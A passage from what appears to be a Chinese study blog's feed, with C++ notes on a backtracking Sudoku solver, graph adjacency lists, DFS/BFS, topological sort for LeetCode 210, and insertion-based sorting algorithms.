<li>判断3*3的小方格内,可以引申出全集被等分为k长度的子集时,判断n属于哪个子集,可以采用<code>n/k*k</code>来找到它对应子集的起始位置</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">solveSudoku</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; board)</span> </span>&#123; <span class="built_in">backTracking</span>(board); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backTracking</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">char</span> k = <span class="string">&#x27;1&#x27;</span>; k &lt;= <span class="string">&#x27;9&#x27;</span>; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">isValid</span>(board, i, j, k)) &#123;</span><br><span class="line">                            <span class="comment">// 有效也只是局部有效,不能表示就高枕无忧了,有可能会被下层推翻</span></span><br><span class="line">                            board[i][j] = k;</span><br><span class="line">                            <span class="keyword">bool</span> flag = <span class="built_in">backTracking</span>(board);</span><br><span class="line">                            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                                <span class="comment">// 找到一个答案,立刻返回,不再回溯</span></span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            board[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//说明上层虽然都有效,但是填的有问题,导致这一层什么都不能填,故回溯</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 说明所有位置都放满了,也就是一个答案</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; board, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">char</span> k)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查同一行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[row][j] == k) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查同一列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][col] == k) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查3*3的方格</span></span><br><span class="line">        <span class="keyword">int</span> startRow = row / <span class="number">3</span> * <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> startCol = col / <span class="number">3</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startRow; i &lt; startRow + <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = startCol; j &lt; startCol + <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == k) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>图</title>
    <url>/2024/10/04/%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><p>记录一些图里面不太系统的代码</p>
<h4 id="邻接表创建图"><a href="#邻接表创建图" class="headerlink" title="邻接表创建图"></a>邻接表创建图</h4><p>创建一个无向图,熟悉一下大概代码就行,考试也用不到</p>
<p>这个无向图的原始图</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410041159712.png" alt="image-20241004115943647"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arcNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> adjVex;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arcNode</span>* <span class="title">nextArc</span>;</span></span><br><span class="line">&#125;arcNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;<span class="comment">//顶点值</span></span><br><span class="line">    arcNode *firstArc;<span class="comment">//第一条边</span></span><br><span class="line">&#125;vNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(vector&lt;vNode&gt;&amp; vertices,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="comment">//无向图要一次在里面插两个边表结点,这里采用头插法</span></span><br><span class="line">    arcNode* arc=(arcNode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(arcNode));</span><br><span class="line">    arc-&gt;adjVex=end;</span><br><span class="line">    arc-&gt;nextArc=<span class="literal">NULL</span>;</span><br><span class="line">    arc-&gt;nextArc=vertices[start].firstArc;</span><br><span class="line">    vertices[start].firstArc=arc;</span><br><span class="line"></span><br><span class="line">    arcNode *arc2=(arcNode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(arcNode));</span><br><span class="line">    arc2-&gt;adjVex=start;</span><br><span class="line">    arc2-&gt;nextArc=<span class="literal">NULL</span>;</span><br><span class="line">    arc2-&gt;nextArc=vertices[end].firstArc;</span><br><span class="line">    vertices[end].firstArc=arc2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printGraph</span><span class="params">(vector&lt;vNode&gt; vertices)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vertices.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        arcNode* temp=vertices[i].firstArc;</span><br><span class="line">        <span class="keyword">while</span>(temp)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; %d\n&quot;</span>,vertices[i].val,temp-&gt;adjVex);</span><br><span class="line">            temp=temp-&gt;nextArc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;vNode&gt; <span class="title">vertices</span><span class="params">(<span class="number">5</span>)</span></span>;<span class="comment">//顶点表</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        vertices[i].val=i;</span><br><span class="line">        vertices[i].firstArc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">addEdge</span>(vertices,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printGraph</span>(vertices);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410041056719.png" alt="image-20241004105622581"></p>
<h3 id="深搜和广搜"><a href="#深搜和广搜" class="headerlink" title="深搜和广搜"></a>深搜和广搜</h3><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410041200771.png" alt="image-20241004115943647" style="zoom:67%;" />

<h4 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h4><h5 id="基于邻接表"><a href="#基于邻接表" class="headerlink" title="基于邻接表"></a>基于邻接表</h5><p>用上边代码生成的无向图的邻接表进行深搜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(vector&lt;vNode&gt;G,<span class="keyword">int</span> startVertex,vector&lt;<span class="keyword">bool</span>&gt;&amp; visited)</span></span>&#123;</span><br><span class="line">    visited[startVertex]=<span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,G[startVertex].val);</span><br><span class="line">    arcNode * p=G[startVertex].firstArc;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visited[p-&gt;adjVex]==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="built_in">DFS</span>(G,p-&gt;adjVex,visited);</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;nextArc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main函数中创建一个visited数组并从起始点调用<span class="function">DFS</span></span><br><span class="line"><span class="function">    vector&lt;<span class="keyword">bool</span>&gt; <span class="title">visited</span><span class="params">(<span class="number">5</span>,<span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="built_in">DFS</span>(vertices,<span class="number">1</span>,visited);</span><br></pre></td></tr></table></figure>

<h5 id="基于邻接矩阵"><a href="#基于邻接矩阵" class="headerlink" title="基于邻接矩阵"></a>基于邻接矩阵</h5><p>上面这个图的邻接矩阵如下</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410041459473.jpg" alt="1004145754" style="zoom: 25%;" />

<p>直接创建一个矩阵当邻接矩阵</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> vertex, <span class="keyword">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里原本是要访问结点数组中的值的,但是这里结点编号和结点里的值一样,就不管了,理解大概方式就行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, vertex);</span><br><span class="line">    visited[vertex] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> G[][<span class="number">5</span>], <span class="keyword">int</span> startVertex, <span class="keyword">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//二维数组传递必须指定大小</span></span><br><span class="line">    <span class="built_in">visit</span>(startVertex, visited);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (G[startVertex][j] == <span class="number">1</span> &amp;&amp; visited[j] == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="built_in">DFS</span>(G, j, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> matrix[<span class="number">5</span>][<span class="number">5</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">bool</span> visited[<span class="number">5</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DFS</span>(matrix, <span class="number">1</span>, visited);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h4><h5 id="基于邻接表-1"><a href="#基于邻接表-1" class="headerlink" title="基于邻接表"></a>基于邻接表</h5><p>注意:对于广度优先遍历,要在结点入队之前就对其进行访问标记</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(vector&lt;vNode&gt;G,<span class="keyword">int</span> startVertex,vector&lt;<span class="keyword">bool</span>&gt;&amp; visited)</span></span>&#123;</span><br><span class="line">    queue&lt;vNode&gt; q;</span><br><span class="line">    visited[startVertex]=<span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//访问</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,startVertex);</span><br><span class="line">    q.<span class="built_in">push</span>(G[startVertex]);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        vNode temp=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        arcNode *p=temp.firstArc;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjVex]==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="comment">//访问</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;adjVex);</span><br><span class="line">                visited[p-&gt;adjVex]=<span class="literal">true</span>;</span><br><span class="line">                <span class="comment">//把刚刚访问过的结点入队</span></span><br><span class="line">                q.<span class="built_in">push</span>(G[p-&gt;adjVex]);</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;nextArc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main函数中创建一个visited数组并从起始点调用<span class="function">DFS</span></span><br><span class="line"><span class="function">    vector&lt;<span class="keyword">bool</span>&gt; <span class="title">visited</span><span class="params">(<span class="number">5</span>,<span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="built_in">BFS</span>(vertices,<span class="number">1</span>,visited);</span><br></pre></td></tr></table></figure>

<h5 id="基于邻接矩阵-1"><a href="#基于邻接矩阵-1" class="headerlink" title="基于邻接矩阵"></a>基于邻接矩阵</h5><p>主要还是注意先访问再入队</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> vertex, <span class="keyword">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里原本是要访问结点数组中的值的,但是这里结点编号和结点里的值一样,就不管了,理解大概方式就行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, vertex);</span><br><span class="line">    visited[vertex] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> G[][<span class="number">5</span>], <span class="keyword">int</span> startVertex, <span class="keyword">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//二维数组传递必须指定大小</span></span><br><span class="line">    <span class="built_in">visit</span>(startVertex, visited);</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(startVertex);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(G[temp][j]==<span class="number">1</span>&amp;&amp;visited[j]== <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="built_in">visit</span>(j,visited);</span><br><span class="line">                q.<span class="built_in">push</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> matrix[<span class="number">5</span>][<span class="number">5</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">                        &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">bool</span> visited[<span class="number">5</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BFS</span>(matrix, <span class="number">1</span>, visited);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><h4 id="210-课程表-II"><a href="#210-课程表-II" class="headerlink" title="210. 课程表 II"></a><a href="https://leetcode.cn/problems/course-schedule-ii/">210. 课程表 II</a></h4><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410041607714.png" alt="image-20241004160719651" style="zoom:67%;" />

<p>本题很明显就是需要采用拓扑排序</p>
<p>因为边没有权值,所以可以直接用一个二维数组当邻接表</p>
<p>在遍历弧集合<code>prerequisites</code>的时候,可以同时建立邻接表<code>Graph</code>和入度表<code>indegree</code></p>
<p>接下来先从入度表中选一个入度为0的顶点放入队列,然后出队,再去根据邻接表记录的弧把入度表对应位置的入队做<code>--</code>操作,每次<code>--</code>完都检查一下当前这个顶点的入度是不是为0了,为0则将其放入队列,重复上述过程,直到队列为空,最后判断出队的元素个数是否和总结点数一样,不一样则说明有环</p>
<p>下面这段代码很巧妙的一点是:利用数组当作队列,把入队和出队转换为rear和front两个下标的变化,就不用额外开一个队列来进行入队出队操作了,最后直接判断rear是否等于结点个数,并且这个数组并没有真正意义上的出队,所以最后直接返回该数组即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findOrder</span><span class="params">(<span class="keyword">int</span> numCourses, vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 建立邻接表和入度表</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">Graph</span>(numCourses);</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">indegree</span><span class="params">(numCourses, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prerequisites.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            indegree[prerequisites[i][<span class="number">0</span>]]++;</span><br><span class="line">            Graph[prerequisites[i][<span class="number">1</span>]].<span class="built_in">push_back</span>(prerequisites[i][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">queue</span><span class="params">(numCourses)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> front = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> rear = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indegree[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                queue[rear++] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (front &lt; rear) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = queue[front];</span><br><span class="line">            front++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; Graph[temp].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="comment">// 弧尾end</span></span><br><span class="line">                <span class="keyword">int</span> end = Graph[temp][j];</span><br><span class="line">                indegree[end]--;</span><br><span class="line">                <span class="keyword">if</span> (indegree[end] == <span class="number">0</span>) &#123;</span><br><span class="line">                    queue[rear++] = end;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rear == numCourses) &#123;</span><br><span class="line">            <span class="keyword">return</span> queue;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>排序</title>
    <url>/2024/10/04/%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>考研复习的时候学习了各种内部排序的原理,在这里代码实现一下</p>
<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>关键点是维护一个有序序列,这里循环从1开始,默认i之前的为有序序列,时间复杂度为O(N²)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp;arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">1</span>&amp;&amp;arr[j]&lt;arr[j<span class="number">-1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> temp=arr[j];</span><br><span class="line">            arr[j]=arr[j<span class="number">-1</span>];</span><br><span class="line">            arr[j<span class="number">-1</span>]=temp;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p>这里比较有意思的就是二分查找插入位置的代码,因为要插入的元素在数组中不存在,所以用left记录了最后一次划分的右区间的开头,也就是插入位置</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binaryInsertSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; arr[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="comment">//说明需要往前面插入了,利用折半查找找到要插入的位置</span></span><br><span class="line">            <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> right = i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">                mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (arr[mid] &gt; temp) &#123;</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//插入右半表</span></span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//最后插入的位置就是右半表的第一个元素</span></span><br><span class="line">            <span class="comment">//后移比temp大的</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &gt; left; j--) &#123;</span><br><span class="line">                arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            arr[left] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p>时间复杂度约为<code>O(N的1.3次方)~O(N²)</code></p>
